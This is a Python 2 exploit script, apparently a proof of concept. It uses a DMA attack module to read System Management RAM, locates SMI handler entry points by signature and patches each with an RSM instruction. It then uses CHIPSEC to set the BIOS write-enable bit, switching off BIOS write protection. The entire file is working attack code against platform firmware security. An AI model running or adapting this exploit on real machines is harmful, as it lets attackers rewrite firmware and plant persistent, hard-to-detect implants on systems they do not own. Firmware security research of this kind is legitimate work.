import sys, os
import dma_expl

CHIPSEC_TOOL_PATH = '/usr/src/chipsec/source/tool'

sys.path = [ CHIPSEC_TOOL_PATH ] + sys.path

#
# Standard SMI entry 16-bit code signature
#
SMI_ENTRY_SIG = [ '\xBB', None, '\x80',                   # mov     bx, 80XXh
                  '\x66', '\x2E', '\xA1', None, '\xFB',   # mov     eax, cs:dword_FBXX
                  '\x66', None, None,                     # mov     edx, eax
                  '\x66', None, None ]                    # mov     ebp, eax

# RSM + NOP patch for SMI entry
SMI_ENTRY_PATCH = '\x0F\xAA\x90'

def find_signature(data, sig, n = 1):

    ptr, ret = 0, []    

    while ptr < len(data):

        found = True

        for i in range(len(sig)):

            # check for signature at given position
            if sig[i] is not None and sig[i] != data[ptr + i]:

                found = False
                break

        if found:

            ret.append(ptr)            

        ptr += n

    return ret

def find_smi_entry(data):

    # check every 100h byte of SMRAM for SMI handler signature
    ret = find_signature(data, SMI_ENTRY_SIG, n = 0x100)

    for ptr in ret:

        print 'SMI entry found at 0x%x' % ptr

    return ret

def patch_smi_entry(smram_addr, smram_size):

    ret = 0
    modified_pages = {}

    print '[+] Dumping SMRAM...'

    # initialize exploit
    expl = dma_expl.DmaExpl(smram_addr)

    try:

        # read all SMRAM contents
        data = expl.read(smram_size)    
        expl.close()

    except Exception, e:

        expl.close()
        raise

    print '[+] Patching SMI entries...'    

    # find SMI handlers offsets
    for ptr in find_smi_entry(data):

        page_offs = ptr & 0xFFF
        page_addr = ptr - page_offs

        # get data for single memory page
        if modified_pages.has_key(page_addr):

            page_data = modified_pages[page_addr]

        else:
            
            page_data = data[ptr : ptr + dma_expl.PAGE_SIZE]

        # patch first instruction of SMI entry
        page_data = page_data[: page_offs] + SMI_ENTRY_PATCH + \
                    page_data[page_offs + len(SMI_ENTRY_PATCH) :]

        modified_pages[page_addr] = page_data
        ret += 1

    for page_addr, page_data in modified_pages.items():

        # initialize exploit
        expl = dma_expl.DmaExpl(smram_addr + page_addr)

        try:

            # write modified page back to SMRAM
            expl.write(page_data)
            expl.close()            

        except Exception, e:

            expl.close()
            raise

    print '[+] DONE, %d SMI handlers patched' % ret

    return ret

def check_bios_cntl():

    BIOSWE = 1

    # import required CHIPSEC stuff
    import chipsec.chipset
    from chipsec.helper.oshelper import helper

    # initialize CHIPSEC helper
    cs = chipsec.chipset.cs()
    cs.init(None, True)

    # check if BIOS_CNTL register is available
    if not chipsec.chipset.is_register_defined(cs, 'BC'):

        raise Exception('Unsupported hardware')

    # get BIOS_CNTL value
    val = chipsec.chipset.read_register(cs, 'BC')

    print '[+] BIOS_CNTL is 0x%x' % val

    if val & BIOSWE == 0:

        print '[+] Trying to set BIOSWE...'
        
        # try to set BIOS write enable bit
        chipsec.chipset.write_register(cs, 'BC', val | BIOSWE)

        # check if BIOSWE bit was actually set
        val = chipsec.chipset.read_register(cs, 'BC')
        if val & BIOSWE == 0:

            # fails, BIOSWE modification was prevented by SMM
            print '[!] Can\'t set BIOSWE bit, BIOS write protection is enabled'
            return False

        else:

            print '[+] BIOSWE bit was set, BIOS write protection is disabled now'

    else:

        print '[+] BIOSWE bit is already set'

    return True

def main():

    if len(sys.argv) < 3:

        print 'USAGE: patch_smi_entry.py <SMRAM_addr> <SMRAM_size>'
        return -1

    addr = int(sys.argv[1], 16)
    size = int(sys.argv[2], 16)

    if check_bios_cntl():

        # BIOSWE is set, SMI code was already patched
        return 0

    # prevent BIOSWE bit reset from SMM code
    patch_smi_entry(addr, size)    

    # try to set BIOSWE
    check_bios_cntl()

if __name__ == '__main__':

    sys.exit(main())

#
# EoF
#
